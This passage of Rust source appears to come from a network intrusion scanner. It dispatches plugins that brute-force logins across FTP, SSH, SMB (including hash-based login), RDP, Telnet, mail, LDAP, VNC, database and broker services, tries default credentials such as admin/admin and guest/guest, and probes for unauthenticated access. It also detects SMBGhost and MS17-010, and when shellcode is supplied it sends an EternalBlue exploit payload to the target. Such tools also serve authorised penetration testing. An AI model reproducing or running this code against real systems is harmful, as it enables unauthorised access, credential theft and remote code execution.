            ports: &[6379, 6380, 16379],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "memcached",
            name: "Memcached",
            ports: &[11211],
            transport: Transport::Tcp,
        },
        PluginDefinition {
            key: "elasticsearch",
            name: "Elasticsearch",
            ports: &[9200, 9300],
            transport: Transport::Tcp,
        },
    ]
}

pub fn scan_services(
    targets: &[OpenService],
    mode: &str,
    context: &PluginContext,
) -> Result<Vec<PluginFinding>> {
    let selected = select_plugins(mode);
    let explicit_mode = mode != "all";
    let tasks = build_service_scan_tasks(targets, &selected, explicit_mode);
    let service_runtime = current_service_scan_runtime_options();
    let auth_runtime = current_auth_runtime_options();
    let redis_runtime = current_redis_runtime_options();
    let ms17010_runtime = current_ms17010_runtime_options();
    let connection_runtime = current_connection_runtime_options();

    execute_service_scan_tasks(
        tasks,
        service_runtime,
        auth_runtime,
        redis_runtime,
        ms17010_runtime,
        connection_runtime,
        |task| scan_service_task(task, context),
    )
}

fn build_service_scan_tasks(
    targets: &[OpenService],
    selected: &[PluginDefinition],
    explicit_mode: bool,
) -> Vec<ServiceScanTask> {
    let mut tasks = Vec::new();
    for target in targets {
        for plugin in selected {
            if !explicit_mode && !plugin.ports.contains(&target.port) {
                continue;
            }
            tasks.push(ServiceScanTask {
                plugin_key: plugin.key,
                target: target.clone(),
            });
        }
    }
    tasks
}

fn execute_service_scan_tasks<F>(
    tasks: Vec<ServiceScanTask>,
    runtime: ServiceScanRuntimeOptions,
    auth_runtime: AuthRuntimeOptions,
    redis_runtime: RedisRuntimeOptions,
    ms17010_runtime: Ms17010RuntimeOptions,
    connection_runtime: ConnectionRuntimeOptions,
    scan_task: F,
) -> Result<Vec<PluginFinding>>
where
    F: Fn(&ServiceScanTask) -> Result<Option<PluginFinding>> + Sync,
{
    if tasks.is_empty() {
        return Ok(Vec::new());
    }

    let worker_count = usize::from(runtime.module_threads.max(1)).min(tasks.len());
    let deadline = Some(Instant::now() + Duration::from_secs(runtime.global_timeout_secs));
    let queue = Arc::new(Mutex::new(VecDeque::from(tasks)));
    let findings = Arc::new(Mutex::new(Vec::new()));
    let errors = Arc::new(Mutex::new(Vec::new()));

    thread::scope(|scope| {
        for _ in 0..worker_count {
            let queue = Arc::clone(&queue);
            let findings = Arc::clone(&findings);
            let errors = Arc::clone(&errors);
            let auth_runtime = auth_runtime.clone();
            let redis_runtime = redis_runtime.clone();
            let ms17010_runtime = ms17010_runtime.clone();
            let connection_runtime = connection_runtime.clone();
            let scan_task = &scan_task;

            scope.spawn(move || {
                set_auth_runtime_options(auth_runtime);
                set_redis_runtime_options(redis_runtime);
                set_ms17010_runtime_options(ms17010_runtime);
                set_connection_runtime_options(connection_runtime);

                loop {
                    if let Some(deadline) = deadline {
                        if Instant::now() >= deadline {
                            break;
                        }
                    }

                    let next = {
                        let mut queue = queue.lock().expect("queue lock poisoned");
                        queue.pop_front()
                    };
                    let Some(task) = next else {
                        break;
                    };

                    match scan_task(&task) {
                        Ok(Some(finding)) => findings
                            .lock()
                            .expect("findings lock poisoned")
                            .push(finding),
                        Ok(None) => {}
                        Err(scan_error) => errors.lock().expect("errors lock poisoned").push(
                            format!(
                                "scan error {}:{} [{}] - {scan_error}",
                                task.target.host, task.target.port, task.plugin_key
                            ),
                        ),
                    }
                }
            });
        }
    });

    let mut errors = Arc::try_unwrap(errors)
        .expect("all workers should exit")
        .into_inner()
        .expect("errors lock poisoned");
    if runtime.log_errors {
        errors.sort();
        for scan_error in errors {
            eprintln!("{scan_error}");
        }
    }

    let mut findings = Arc::try_unwrap(findings)
        .expect("all workers should exit")
        .into_inner()
        .expect("findings lock poisoned");
    sort_plugin_findings(&mut findings);

    Ok(findings)
}

fn sort_plugin_findings(findings: &mut [PluginFinding]) {
    findings.sort_by(|left, right| {
        left.target
            .host
            .cmp(&right.target.host)
            .then_with(|| left.target.port.cmp(&right.target.port))
            .then_with(|| left.plugin.cmp(&right.plugin))
            .then_with(|| left.status.cmp(&right.status))
    });
}

fn scan_service_task(
    task: &ServiceScanTask,
    context: &PluginContext,
) -> Result<Option<PluginFinding>> {
    let target = &task.target;
    match task.plugin_key {
        "ftp" => scan_ftp(target, context),
        "ssh" => scan_ssh(target, context),
        "smb" => scan_smb(target, context),
        "smb2" => scan_smb2(target, context),
        "telnet" => scan_telnet(target, context),
        "rdp" => scan_rdp(target, context),
        "findnet" => scan_findnet(target, context.timeout_secs),
        "netbios" => scan_netbios(target, context.timeout_secs),
        "smtp" => scan_smtp(target, context),
        "imap" => scan_imap(target, context),
        "pop3" => scan_pop3(target, context),
        "activemq" => scan_activemq(target, context),
        "rsync" => scan_rsync(target, context),
        "rabbitmq" => scan_rabbitmq(target, context),
        "mongodb" => scan_mongodb(target),
        "modbus" => scan_modbus(target, context.timeout_secs),
        "ldap" => scan_ldap(target, context),
        "vnc" => scan_vnc(target, context),
        "ms17010" => scan_ms17010(target, context.timeout_secs),
        "smbghost" => scan_smbghost(target, context.timeout_secs),
        "kafka" => scan_kafka(target, context),
        "mysql" => scan_mysql(target, context),
        "postgres" => scan_postgres(target, context),
        "neo4j" => scan_neo4j(target, context),
        "cassandra" => scan_cassandra(target, context),
        "snmp" => scan_snmp(target, context.timeout_secs),
        "redis" => scan_redis(target, context),
        "memcached" => scan_memcached(target, context),
        "elasticsearch" => scan_elasticsearch(target, context),
        "mssql" => scan_mssql(target, context),
        "oracle" => scan_oracle(target, context),
        _ => Ok(None),
    }
}

pub fn select_plugins(mode: &str) -> Vec<PluginDefinition> {
    if mode == "all" {
        registered_plugins()
    } else {
        let requested = parse_plugin_list(mode);
        if requested.is_empty() {
            return Vec::new();
        }

        let registry = registered_plugins()
            .into_iter()
            .map(|plugin| (plugin.key.to_string(), plugin))
            .collect::<BTreeMap<_, _>>();

        requested
            .into_iter()
            .filter_map(|item| registry.get(item.as_str()).cloned())
            .collect()
    }
}

fn parse_plugin_list(mode: &str) -> Vec<String> {
    let mut parsed = Vec::new();
    for item in mode.split(',').map(str::trim).filter(|item| !item.is_empty()) {
        let item = item.to_string();
        if !parsed.contains(&item) {
            parsed.push(item);
        }
    }
    parsed
}

fn scan_ftp(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if ftp_login(target, "anonymous", "", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "ftp".to_string(),
            target: target.clone(),
            status: "anonymous-login".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("ftp")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-login")),
                ("username".to_string(), json!("anonymous")),
                ("password".to_string(), json!("")),
            ]),
        }));
    }

    for username in usernames_for_service("ftp", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if ftp_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "ftp".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("ftp")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_smb(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_smb_with(target, context, smb_login)
}

fn scan_smb2(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_smb2_with(target, context, smb2_login)
}

fn scan_smb_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    for username in usernames_for_service("smb", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if login(target, &username, &password, &domain, context.timeout_secs)? {
                let mut details = BTreeMap::from([
                    ("service".to_string(), json!("smb")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                ]);
                if !domain.is_empty() {
                    details.insert("domain".to_string(), json!(domain));
                }
                return Ok(Some(PluginFinding {
                    plugin: "smb".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details,
                }));
            }
        }
    }

    Ok(None)
}

fn scan_smb2_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, Smb2AuthMode, u64) -> Result<Option<Vec<String>>>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    let usernames = usernames_for_service("smb2", context);
    if !runtime.hashes.is_empty() {
        for username in usernames {
            for hash in &runtime.hashes {
                if let Some(shares) = login(
                    target,
                    &username,
                    hash,
                    &domain,
                    Smb2AuthMode::Hash,
                    context.timeout_secs,
                )? {
                    return Ok(Some(build_smb2_finding(
                        target,
                        &username,
                        hash,
                        &domain,
                        Smb2AuthMode::Hash,
                        shares,
                    )));
                }
            }
        }
        return Ok(None);
    }

    for username in usernames {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if let Some(shares) = login(
                target,
                &username,
                &password,
                &domain,
                Smb2AuthMode::Password,
                context.timeout_secs,
            )? {
                return Ok(Some(build_smb2_finding(
                    target,
                    &username,
                    &password,
                    &domain,
                    Smb2AuthMode::Password,
                    shares,
                )));
            }
        }
    }

    Ok(None)
}

fn scan_rdp(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_rdp_with(target, context, rdp_login)
}

fn scan_rdp_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    for username in usernames_for_service("rdp", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if login(target, &username, &password, &domain, context.timeout_secs)? {
                let mut details = BTreeMap::from([
                    ("service".to_string(), json!("rdp")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                ]);
                if !domain.is_empty() {
                    details.insert("domain".to_string(), json!(domain));
                }
                return Ok(Some(PluginFinding {
                    plugin: "rdp".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details,
                }));
            }
        }
    }

    Ok(None)
}

fn scan_ssh(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("ssh", context) {
        if let Some(key_path) = &context.ssh_key_path {
            if ssh_key_login(target, &username, key_path, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "ssh".to_string(),
                    target: target.clone(),
                    status: "vulnerable".to_string(),
                    details: BTreeMap::from([
                        ("port".to_string(), json!(target.port)),
                        ("service".to_string(), json!("ssh")),
                        ("username".to_string(), json!(username)),
                        ("type".to_string(), json!("weak-password")),
                        ("auth_type".to_string(), json!("key")),
                        (
                            "key_path".to_string(),
                            json!(key_path.to_string_lossy().to_string()),
                        ),
                    ]),
                }));
            }
        }

        for password in passwords_for_user(Some(username.as_str()), context) {
            if ssh_password_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "ssh".to_string(),
                    target: target.clone(),
                    status: "vulnerable".to_string(),
                    details: BTreeMap::from([
                        ("port".to_string(), json!(target.port)),
                        ("service".to_string(), json!("ssh")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                        ("type".to_string(), json!("weak-password")),
                        ("auth_type".to_string(), json!("password")),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_telnet(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if probe_telnet_access(target, context.timeout_secs)? == TelnetAccess::NoAuth {
        return Ok(Some(PluginFinding {
            plugin: "telnet".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("telnet")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
            ]),
        }));
    }

    for username in usernames_for_service("telnet", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if telnet_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "telnet".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("telnet")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_smtp(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if smtp_login(target, "", "", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "smtp".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("smtp")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
                ("anonymous".to_string(), json!(true)),
            ]),
        }));
    }

    for username in usernames_for_service("smtp", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if smtp_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "smtp".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("smtp")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_imap(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("imap", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if imap_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "imap".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("imap")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_pop3(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("pop3", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            let (authenticated, tls) = pop3_login(target, &username, &password, context.timeout_secs)?;
            if authenticated {
                return Ok(Some(PluginFinding {
                    plugin: "pop3".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("pop3")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                        ("tls".to_string(), json!(tls)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_activemq(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if activemq_login(target, "admin", "admin", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "activemq".to_string(),
            target: target.clone(),
            status: "weak-password".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("activemq")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("weak-password")),
                ("username".to_string(), json!("admin")),
                ("password".to_string(), json!("admin")),
            ]),
        }));
    }

    for username in usernames_for_service("activemq", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if username == "admin" && password == "admin" {
                continue;
            }
            if activemq_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "activemq".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("activemq")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_rsync(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if let Some(module) = rsync_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "rsync".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("rsync")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
                ("module".to_string(), json!(module)),
            ]),
        }));
    }

    for username in usernames_for_service("rsync", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if let Some(module) = rsync_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "rsync".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("rsync")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("module".to_string(), json!(module)),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_rabbitmq(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    scan_rabbitmq_with(target, context, rabbitmq_login)
}

fn scan_rabbitmq_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, u64) -> Result<bool>,
{
    if brute_force_disabled() {
        return Ok(None);
    }
    if login(target, "guest", "guest", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "rabbitmq".to_string(),
            target: target.clone(),
            status: "weak-password".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("rabbitmq")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("weak-password")),
                ("username".to_string(), json!("guest")),
                ("password".to_string(), json!("guest")),
            ]),
        }));
    }

    for username in usernames_for_service("rabbitmq", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if username == "guest" && password == "guest" {
                continue;
            }
            if login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "rabbitmq".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("rabbitmq")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_mongodb(target: &OpenService) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if mongodb_unauthorized(target)? {
        return Ok(Some(PluginFinding {
            plugin: "mongodb".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("mongodb")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
                ("protocol".to_string(), json!("mongodb")),
            ]),
        }));
    }

    Ok(None)
}

fn scan_modbus(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if let Some(device_info) = modbus_probe(target, timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "modbus".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("modbus")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
                ("device_info".to_string(), json!(device_info)),
            ]),
        }));
    }

    Ok(None)
}

fn scan_ldap(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if ldap_bind_and_search(target, "", "", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "ldap".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("ldap")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
            ]),
        }));
    }

    for username in usernames_for_service("ldap", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if ldap_bind_and_search(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "ldap".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("ldap")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_vnc(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for password in passwords_for_user(None, context) {
        if vnc_login(target, &password, context.timeout_secs)? {
            return Ok(Some(PluginFinding {
                plugin: "vnc".to_string(),
                target: target.clone(),
                status: "weak-password".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("vnc")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("password".to_string(), json!(password)),
                ]),
            }));
        }
    }

    Ok(None)
}

fn scan_findnet(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if let Some((hostname, ipv4, ipv6)) = findnet_probe(target, timeout_secs)? {
        let mut details = BTreeMap::new();
        if !hostname.is_empty() {
            details.insert("hostname".to_string(), json!(hostname));
        }
        if !ipv4.is_empty() {
            details.insert("ipv4".to_string(), json!(ipv4));
        }
        if !ipv6.is_empty() {
            details.insert("ipv6".to_string(), json!(ipv6));
        }
        return Ok(Some(PluginFinding {
            plugin: "findnet".to_string(),
            target: target.clone(),
            status: "identified".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_netbios(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if let Some(info) = netbios_probe(target, timeout_secs)? {
        let mut details = BTreeMap::from([("port".to_string(), json!(target.port))]);
        if !info.computer_name.is_empty() {
            details.insert("computer_name".to_string(), json!(info.computer_name));
        }
        if !info.domain_name.is_empty() {
            details.insert("domain_name".to_string(), json!(info.domain_name));
        }
        if !info.netbios_domain.is_empty() {
            details.insert("netbios_domain".to_string(), json!(info.netbios_domain));
        }
        if !info.netbios_computer.is_empty() {
            details.insert("netbios_computer".to_string(), json!(info.netbios_computer));
        }
        if !info.workstation_service.is_empty() {
            details.insert(
                "workstation_service".to_string(),
                json!(info.workstation_service),
            );
        }
        if !info.server_service.is_empty() {
            details.insert("server_service".to_string(), json!(info.server_service));
        }
        if !info.domain_controllers.is_empty() {
            details.insert(
                "domain_controllers".to_string(),
                json!(info.domain_controllers),
            );
        }
        if !info.os_version.is_empty() {
            details.insert("os_version".to_string(), json!(info.os_version));
        }
        return Ok(Some(PluginFinding {
            plugin: "netbios".to_string(),
            target: target.clone(),
            status: "identified".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_smbghost(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if detect_smbghost(target, timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "smbghost".to_string(),
            target: target.clone(),
            status: "vulnerable".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("smb")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("cve-2020-0796")),
                ("name".to_string(), json!("SmbGhost")),
            ]),
        }));
    }

    Ok(None)
}

fn scan_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if let Some((os, backdoor)) = detect_ms17010(target, timeout_secs)? {
        let mut details = BTreeMap::from([
            ("service".to_string(), json!("smb")),
            ("port".to_string(), json!(target.port)),
            ("vulnerability".to_string(), json!("MS17-010")),
        ]);
        let runtime = current_ms17010_runtime_options();
        if !os.is_empty() {
            details.insert("os".to_string(), json!(os));
        }
        if backdoor {
            details.insert("backdoor".to_string(), json!("DOUBLEPULSAR"));
        }
        if let Some(shellcode) = runtime
            .shellcode
            .as_deref()
            .filter(|value| !value.trim().is_empty())
        {
            match exploit_ms17010(target, timeout_secs, shellcode) {
                Ok(()) => {
                    details.insert("exploit".to_string(), json!("payload-sent"));
                }
                Err(error) => {
                    details.insert("exploit".to_string(), json!("failed"));
                    details.insert("exploit_error".to_string(), json!(error.to_string()));
                }
            }
        }
        return Ok(Some(PluginFinding {
            plugin: "ms17010".to_string(),
            target: target.clone(),
            status: "vulnerable".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_kafka(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if kafka_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "kafka".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("kafka")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
            ]),
        }));
    }

    for username in usernames_for_service("kafka", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if kafka_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "kafka".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("kafka")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_snmp(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for community in DEFAULT_SNMP_COMMUNITIES {
        if let Some(system) = snmp_get_sysdescr(target, community, timeout_secs)? {
            return Ok(Some(PluginFinding {
                plugin: "snmp".to_string(),
                target: target.clone(),
                status: "weak-community".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("snmp")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-community")),
                    ("community".to_string(), json!(community)),
                    ("system".to_string(), json!(system)),
                ]),
            }));
        }
    }

    Ok(None)
}

fn scan_mssql(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("mssql", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if mssql_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "mssql".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("mssql")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_oracle(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_oracle_with(target, context, oracle_login)
}

fn scan_oracle_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64, bool) -> Result<bool>,
{
    let mut attempted = BTreeSet::new();

    for (username, password) in ORACLE_HIGH_RISK_CREDENTIALS {
        let username = (*username).to_string();
        let password = (*password).to_string();
        if !attempted.insert((username.clone(), password.clone())) {
            continue;
        }
        if let Some(finding) = oracle_attempt_service_names(
            target,
            &username,
            &password,
            context.timeout_secs,
            &mut login,
        )? {
            return Ok(Some(finding));
        }
    }

    for raw_username in usernames_for_service("oracle", context) {
        let username = raw_username.to_ascii_uppercase();
        for password in passwords_for_user(Some(raw_username.as_str()), context) {
            if !attempted.insert((username.clone(), password.clone())) {
                continue;
            }
            if let Some(finding) = oracle_attempt_service_names(
                target,
                &username,
                &password,
                context.timeout_secs,
                &mut login,
            )? {
                return Ok(Some(finding));
            }
        }
    }

    Ok(None)
}

fn oracle_attempt_service_names<F>(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
    login: &mut F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64, bool) -> Result<bool>,
{
    for service_name in ORACLE_COMMON_SERVICE_NAMES {
        if login(target, username, password, service_name, timeout_secs, false)?
            || (username.eq_ignore_ascii_case("SYS")
                && login(target, username, password, service_name, timeout_secs, true)?)
        {
            return Ok(Some(PluginFinding {
                plugin: "oracle".to_string(),
                target: target.clone(),
                status: "weak-password".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("oracle")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                    ("service_name".to_string(), json!(service_name)),
